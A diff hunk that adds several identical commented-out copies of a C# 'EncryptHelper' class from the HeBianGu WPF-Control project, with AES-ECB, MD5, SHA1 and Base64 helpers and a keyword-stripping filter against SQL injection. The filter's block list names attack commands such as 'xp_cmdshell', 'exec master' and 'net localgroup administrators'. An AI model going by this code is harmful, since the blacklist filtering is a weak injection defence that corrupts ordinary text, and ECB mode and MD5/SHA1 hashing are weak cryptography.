@@ -213,59 +213,1088 @@
 //    }
 //}
 
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
 
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
